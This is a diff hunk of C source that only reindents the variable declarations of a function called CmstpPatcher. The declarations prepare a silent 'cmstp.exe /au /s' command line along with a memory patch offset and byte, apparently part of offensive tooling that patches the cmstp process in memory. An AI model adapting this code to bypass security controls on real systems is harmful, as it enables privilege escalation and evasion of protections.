@@ -2,20 +2,20 @@
 
 BOOL CmstpPatcher(PWCHAR pszConfig) {
 	 
-	WCHAR				szCmstp[]			= L"C:\\Windows\\System32\\cmstp.exe /au /s ";
-	STARTUPINFO         si					= { 0 };
-	PROCESS_INFORMATION pi					= { 0 };
+	WCHAR				szCmstp[]		= L"C:\\Windows\\System32\\cmstp.exe /au /s ";
+	STARTUPINFO         		si			= { 0 };
+	PROCESS_INFORMATION 		pi			= { 0 };
 	PWCHAR				lpCommandLineW		= NULL;
-	SIZE_T				sLength				= 0;
+	SIZE_T				sLength			= 0;
 
-	ULONGLONG			uImageBase			= NULL;
+	ULONGLONG			uImageBase		= NULL;
 	ULONGLONG			uPatchAddress		= NULL;
 	ULONGLONG			uPatchOffset		= 0x78A9;
 	
 	DWORD				flOldProtection		= 0x0;
-	SIZE_T              sBytesWritten		= 0;
-	BYTE				Patch				= 0x85;
-	BOOL				status				= TRUE;
+	SIZE_T              		sBytesWritten		= 0;
+	BYTE				Patch			= 0x85;
+	BOOL				status			= TRUE;
 
 	si.cb = sizeof(si);
 
